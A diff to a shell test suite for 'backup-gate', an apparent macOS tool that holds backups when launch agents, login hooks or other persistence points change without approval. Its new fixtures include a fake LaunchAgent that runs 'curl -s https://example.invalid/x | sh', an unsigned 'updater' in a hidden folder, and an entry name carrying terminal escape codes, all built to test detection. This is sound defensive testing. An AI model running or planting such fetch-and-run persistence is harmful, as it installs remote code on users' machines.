@@ -15,7 +15,8 @@ sed -e "s#^SELF=.*#SELF=$T/backup-gate#" -e "s#^ETC=.*#ETC=$T/etc#" -e "s#^STATE
 awk -v T="$T" '/^case "\$\{1:-\}" in/ {
   print "refresh() { cp \"" T "/inv\" \"$STATE/current\"; : > \"$STATE/flags\"; }"
   print "exclusions() { :; }"
-  print "notify() { log \"NOTIFY: $1\"; }" } { print }' > "$T/backup-gate"
+  print "notify() { log \"NOTIFY: $1\"; }"
+  print "if [ \"${1:-}\" = __describe ]; then describe \"$2\" \"$3\" \"$4\"; exit; fi" } { print }' > "$T/backup-gate"
 sed -e 's/__DEST_ID__/TESTDEST/' -e 's/__DEST_VOLUME__/TESTVOL/' "$(dirname "$GATE")/config.example" > "$T/etc/config"
 printf 'launch\t/Library/LaunchDaemons/x\troot:wheel:644\tabc\n' > "$T/inv"
 cp "$T/inv" "$T/etc/allowlist"
@@ -62,7 +63,7 @@ age() { echo $(( $(date +%s) - $(cat "$T/state/last-success") )); }
 check() {  # name, condition...
   local name=$1; shift
   if "$@"; then pass=$((pass + 1)); echo "ok   $name"
-  else fail=$((fail + 1)); echo "FAIL $name"; sed 's/^/       log: /' "$T/log"; fi
+  else fail=$((fail + 1)); echo "FAIL $name"; sed 's/^/       log: /' "$T/log"; [ -s "${F:-/nonexistent}/out" ] && sed 's/^/       out: /' "$F/out"; fi
 }
 logged() { grep -q -- "$1" "$T/log"; }
 snaps() { [ "$(wc -l < "$T/snaps" | tr -d ' ')" = "$1" ]; }
@@ -86,7 +87,7 @@ reset 1; gate now
 check "'run now' ignores MIN_HOURS"            eval 'logged "backup finished" && snaps 2'
 
 reset 5; printf 'launch\t/Library/LaunchAgents/new\troot:wheel:644\tdef\n' >> "$T/inv"; gate
-check "unapproved change: blocked, notified"   eval '[ $rc = 3 ] && logged "BLOCKED: 1 line" && logged "NOTIFY:" && snaps 1'
+check "unapproved change: blocked, notified"   eval '[ $rc = 3 ] && logged "BLOCKED: 1 change" && logged "NOTIFY:" && snaps 1'
 
 reset 5; echo No > "$T/mounted"; gate
 check "destination not mounted: skipped"       eval 'logged "not mounted" && snaps 1'
@@ -99,6 +100,48 @@ check "another run in progress: skipped"       eval 'logged "another run is in p
 
 reset 5; gate
 check "lock released after a run"              eval '[ ! -e "$T/lock" ]'
+
+# ---- readable change list (approve / status) ----
+echo
+F=$T/fx; mkdir -p "$F/Library/LaunchAgents" "$F/.hidden"
+plutil -create xml1 "$F/Library/LaunchAgents/com.update.helper.plist"
+plutil -insert Label -string com.update.helper "$F/Library/LaunchAgents/com.update.helper.plist"
+plutil -insert ProgramArguments -json '["/bin/bash","-c","curl -s https://example.invalid/x | sh"]' "$F/Library/LaunchAgents/com.update.helper.plist"
+printf '#!/bin/sh\nexit 0\n' > "$F/.hidden/updater"; chmod +x "$F/.hidden/updater"
+TAB=$'\t' ESC=$'\033'
+old=$F/old new=$F/new
+desc() { "$T/backup-gate" __describe "$old" "$new" "$1" > "$F/out" 2>&1; }
+has() { grep -qF -- "$1" "$F/out"; }
+
+: > "$old"
+printf 'launch%s%s/Library/LaunchAgents/com.update.helper.plist%syou:staff:644%sabc\n' "$TAB" "$F" "$TAB" "$TAB" > "$new"
+desc full
+check "added agent: label, arguments, signer, interpreter warning" eval 'has "+ ADDED   Launch agent (user fx)" && has "runs     /bin/bash -c '"'"'curl -s https://example.invalid/x | sh'"'"'" && has "signer   Apple" && has "! starts bash"'
+
+printf 'btm%s501%sapp (0x2)|2.com.evil%s[2Jx|%s/.hidden/updater|%s/.hidden/updater\n' "$TAB" "$TAB" "$ESC" "$F" "$F" > "$new"
+desc full
+check "unsigned program in hidden folder: warnings" eval 'has "signer   UNSIGNED" && has "! not signed by an identified developer" && has "! runs from a temporary, shared or hidden folder"'
+check "terminal escape codes are stripped"         eval '! grep -q "$ESC" "$F/out" && has "com.evil[2Jx"'
+
+printf 'btm%s501%sapp (0x2)|2.com.good|/Applications/Good.app|\n' "$TAB" "$TAB" > "$old"
+{ printf 'btm%s501%sapp (0x2)|2.com.good|/Applications/AAA.app|\n' "$TAB" "$TAB"; cat "$old"; } > "$new"
+desc brief
+check "duplicate of an approved id shows up"       eval '[ "$(grep -c "ADDED\|CHANGED" "$F/out")" = 1 ]'
+
+printf 'launch%s/Library/LaunchDaemons/a.plist%sroot:wheel:644%sabc\nshell%s/Users/u/.zshrc%sABSENT\nsystem%s%s%sold\n' \
+  "$TAB" "$TAB" "$TAB" "$TAB" "$TAB" "$TAB" /usr/local/sbin/backup-gate "$TAB" > "$old"
+printf 'launch%s/Library/LaunchDaemons/a.plist%su:staff:666%sdef\nshell%s/Users/u/.zshrc%sfff\nsystem%s%s%snew\n' \
+  "$TAB" "$TAB" "$TAB" "$TAB" "$TAB" "$TAB" /usr/local/sbin/backup-gate "$TAB" > "$new"
+sed -i '' "s#/usr/local/sbin/backup-gate#$T/backup-gate#" "$old" "$new"
+desc full
+check "changed: permissions, contents, created"    eval 'has "permissions root wheel 644 -> u staff 666" && has "change   contents changed" && has "change   created"'
+check "gate's own files are labeled"               eval 'has "backup-gate itself"'
+check "three changes, launch daemons listed first" eval '[ "$(grep -c "^~ CHANGED" "$F/out")" = 3 ] && head -n 1 "$F/out" | grep -q "Launch daemon"'
+
+old=/dev/null; printf 'shell%s/Users/u/.zshrc%sABSENT\nhook%s/x:LoginHook%snone\nlaunch%s/Library/LaunchDaemons/a.plist%sroot:wheel:644%sabc\n' \
+  "$TAB" "$TAB" "$TAB" "$TAB" "$TAB" "$TAB" "$TAB" > "$new"
+desc compact
+check "first approval hides watched-but-absent files" eval '[ "$(grep -c "^  \* " "$F/out")" = 1 ] && has "they don'"'"'t exist yet: 2"'
 
 echo; echo "$pass passed, $fail failed"
 [ "$fail" = 0 ]
